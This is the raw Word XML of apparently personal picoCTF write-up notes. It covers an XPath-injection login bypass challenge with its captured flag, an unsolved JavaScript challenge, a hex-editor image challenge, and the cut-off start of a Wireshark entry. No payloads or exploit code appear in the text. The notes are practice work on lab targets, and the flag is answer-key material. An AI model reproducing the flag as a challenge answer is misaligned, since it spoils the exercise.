    <w:p w14:paraId="308E88CB" w14:textId="6722A138" w:rsidR="00DB370A" w:rsidRDefault="00DB370A" w:rsidP="00244A25">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="121AC751" w14:textId="77777777" w:rsidR="00E12D05" w:rsidRDefault="00E12D05" w:rsidP="00E12D05">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X marks the spot</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="285D20C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 | 250 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17BF4E88" w14:textId="77777777" w:rsidR="00E12D05" w:rsidRDefault="00E12D05" w:rsidP="00E12D0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2021Web Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="213481E3" w14:textId="77777777" w:rsidR="00E12D05" w:rsidRDefault="00E12D05" w:rsidP="00E12D0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MADSTACKS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7667AA11"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01F44EC2" w14:textId="77777777" w:rsidR="00E12D05" w:rsidRDefault="00E12D05" w:rsidP="00E12D0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Another login you have to bypass. Maybe you can find an injection that works? </w:t>
      </w:r>
      <w:hyperlink r:id="rId169" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:53735/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="147E1044" w14:textId="77777777" w:rsidR="00E12D05" w:rsidRDefault="00000000" w:rsidP="00E12D05">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="212121"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="212121"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:pict w14:anchorId="5215318D">
          <v:rect id="_x0000_i1026" style="width:0;height:0" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="4342C57D" w14:textId="77777777" w:rsidR="00E12D05" w:rsidRDefault="00E12D05" w:rsidP="00E12D05">
      <w:pPr>
        <w:pStyle w:val="text-white"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>debug info: [u:283398 e: p: c:185 i:1027]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="739F3382" w14:textId="77777777" w:rsidR="00E12D05" w:rsidRDefault="00E12D05" w:rsidP="00E12D0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Hints </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D880008" w14:textId="77777777" w:rsidR="00E12D05" w:rsidRDefault="00E12D05" w:rsidP="00E12D05">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5760BD9" w14:textId="77777777" w:rsidR="00E12D05" w:rsidRDefault="00E12D05" w:rsidP="00E12D05">
      <w:pPr>
        <w:pStyle w:val="body-sm"/>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XPATH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="368FDA81" w14:textId="77DD4132" w:rsidR="00DB370A" w:rsidRDefault="00E12D05" w:rsidP="00244A25">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>XPATH injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E1B22DB" w14:textId="680C3CE1" w:rsidR="00E12D05" w:rsidRDefault="00E12D05" w:rsidP="00244A25">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E12D05">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="388864EC" w14:textId="63947BC3" w:rsidR="000F619C" w:rsidRDefault="000F619C" w:rsidP="00244A25">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="525CD35C" w14:textId="0C9D66EC" w:rsidR="000F619C" w:rsidRDefault="00000000" w:rsidP="00244A25">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId170" w:history="1">
        <w:r w:rsidR="000F619C" w:rsidRPr="00B44B5A">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
            <w:lang w:val="en-CA"/>
          </w:rPr>
          <w:t>https://zhangzeyu2001.medium.com/blind-xpath-injections-the-path-less-travelled-6f03ce5ec8f6</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7943ADF6" w14:textId="2D2FAF4C" w:rsidR="00583AE0" w:rsidRDefault="00274155" w:rsidP="00583AE0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1964BBC5" wp14:editId="1B6FA171">
            <wp:extent cx="6332220" cy="237363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171"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2373630"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6688EE67" w14:textId="24913CFA" w:rsidR="00997DDB" w:rsidRDefault="00997DDB" w:rsidP="00997DDB">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72DCFCE3" w14:textId="22DE87E7" w:rsidR="00274155" w:rsidRDefault="00274155" w:rsidP="00997DDB">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E107113" w14:textId="1633698A" w:rsidR="00274155" w:rsidRDefault="00274155" w:rsidP="00997DDB">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00274155">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00274155">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>{h0p3fully_u_t0ok_th3_r1ght_xp4th_a8550ff2}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F5BD5FE" w14:textId="412D5574" w:rsidR="00274155" w:rsidRDefault="00274155" w:rsidP="00997DDB">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="205ABE67" w14:textId="7A316050" w:rsidR="00274155" w:rsidRDefault="00274155" w:rsidP="00274155">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A5684E">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Java Script Kiddie</w:t>
      </w:r>
      <w:r w:rsidR="00A5684E">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t xml:space="preserve"> not solved</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54474118"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 | 400 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C992117" w14:textId="77777777" w:rsidR="00274155" w:rsidRDefault="00274155" w:rsidP="00274155">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2019Web Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2997545C" w14:textId="77777777" w:rsidR="00274155" w:rsidRDefault="00274155" w:rsidP="00274155">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JOHN JOHNSON</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D8C2191" w14:textId="77777777" w:rsidR="00274155" w:rsidRDefault="00274155" w:rsidP="00274155">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73F090D6" w14:textId="0790FBCB" w:rsidR="00274155" w:rsidRDefault="00274155"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 xml:space="preserve">The image link appears broken... https://jupiter.challenges.picoctf.org/problem/58112 or </w:t>
      </w:r>
      <w:hyperlink r:id="rId172" w:history="1">
        <w:r w:rsidR="005E210F" w:rsidRPr="00B44B5A">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://jupiter.challenges.picoctf.org:58112</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7D7B8241" w14:textId="3C9E1071" w:rsidR="005E210F" w:rsidRDefault="005E210F" w:rsidP="00274155">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Hint:</w:t>
      </w:r>
      <w:r w:rsidRPr="005E210F">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>This is only a JavaScript problem</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0334175D" w14:textId="22E4EE05" w:rsidR="00274155" w:rsidRDefault="005E210F" w:rsidP="00997DDB">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5B0E85BA" wp14:editId="3B5BABD5">
            <wp:extent cx="6332220" cy="4028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73"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="4028440"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="438C0265" w14:textId="316FED8F" w:rsidR="005E210F" w:rsidRDefault="005E210F" w:rsidP="00997DDB">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>ssessment:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DF95CE5" w14:textId="0675F6DA" w:rsidR="005E210F" w:rsidRDefault="00F82FA8" w:rsidP="00997DDB">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="281E2B3D" wp14:editId="286D8BD8">
            <wp:extent cx="4816257" cy="609653"/>
            <wp:effectExtent l="0" t="0" r="381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74"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4816257" cy="609653"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="768BB16E" w14:textId="6822B78E" w:rsidR="00A5684E" w:rsidRDefault="00A5684E" w:rsidP="00997DDB">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="16E8A053" w14:textId="755B4C8B" w:rsidR="00A5684E" w:rsidRDefault="00A5684E" w:rsidP="00997DDB">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A9459C5" w14:textId="3844BC59" w:rsidR="00A5684E" w:rsidRDefault="00A5684E" w:rsidP="00997DDB">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AE84C61" w14:textId="77777777" w:rsidR="00A5684E" w:rsidRPr="00A5684E" w:rsidRDefault="00A5684E" w:rsidP="00A5684E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A5684E">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Glory of the Garden</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC6DF4F" w14:textId="77777777" w:rsidR="00A5684E" w:rsidRPr="00A5684E" w:rsidRDefault="00A5684E" w:rsidP="00A5684E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A5684E">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>| 50 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6471AAC5" w14:textId="77777777" w:rsidR="00A5684E" w:rsidRPr="00A5684E" w:rsidRDefault="00A5684E" w:rsidP="00A5684E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A5684E">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B135EF" w14:textId="77777777" w:rsidR="00A5684E" w:rsidRPr="00A5684E" w:rsidRDefault="00A5684E" w:rsidP="00A5684E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="646F0104" w14:textId="77777777" w:rsidR="00A5684E" w:rsidRPr="00A5684E" w:rsidRDefault="00A5684E" w:rsidP="00A5684E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A5684E">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Author: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A5684E">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>jedavis</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A5684E">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>/Danny</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1186E593" w14:textId="77777777" w:rsidR="00A5684E" w:rsidRPr="00A5684E" w:rsidRDefault="00A5684E" w:rsidP="00A5684E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A5684E">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F21FA30" w14:textId="77777777" w:rsidR="00A5684E" w:rsidRPr="00A5684E" w:rsidRDefault="00A5684E" w:rsidP="00A5684E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FFA7DBF" w14:textId="0FA4CBCD" w:rsidR="00A5684E" w:rsidRDefault="00A5684E" w:rsidP="00A5684E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A5684E">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>This garden contains more than it seems.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="402B3F41" w14:textId="44D51371" w:rsidR="00E43273" w:rsidRDefault="00E43273" w:rsidP="00A5684E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>int:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D57A57A" w14:textId="3C24D855"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What is a hex editor?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C8C05E9" w14:textId="7555FAC9" w:rsidR="00E43273" w:rsidRDefault="00E43273" w:rsidP="00A5684E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">Use </w:t>
      </w:r>
      <w:hyperlink r:id="rId175" w:history="1">
        <w:r w:rsidRPr="00E43273">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t xml:space="preserve">this online </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E43273">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>hexeditor</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">  open the garden.jpg </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0002F4C7" w14:textId="54F6F229" w:rsidR="00E43273" w:rsidRDefault="00E43273" w:rsidP="00A5684E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2A1261DE" wp14:editId="11C88730">
            <wp:extent cx="6332220" cy="2742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32220" cy="2742565"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="20B4F1CD" w14:textId="58AD1652" w:rsidR="00E43273" w:rsidRDefault="00E43273" w:rsidP="00A5684E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19760BBB" w14:textId="77777777" w:rsidR="00E43273" w:rsidRPr="00E43273" w:rsidRDefault="00E43273" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E43273">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Wireshark doo </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E43273">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>dooo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E43273">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> do doo...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60ACC9DE" w14:textId="77777777" w:rsidR="00E43273" w:rsidRPr="00E43273" w:rsidRDefault="00E43273" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E43273">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>| 50 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FC927AF" w14:textId="77777777" w:rsidR="00E43273" w:rsidRPr="00E43273" w:rsidRDefault="00E43273" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E43273">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43043CD7" w14:textId="77777777" w:rsidR="00E43273" w:rsidRPr="00E43273" w:rsidRDefault="00E43273" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="149EDCE6" w14:textId="77777777" w:rsidR="00E43273" w:rsidRPr="00E43273" w:rsidRDefault="00E43273" w:rsidP="00E43273">
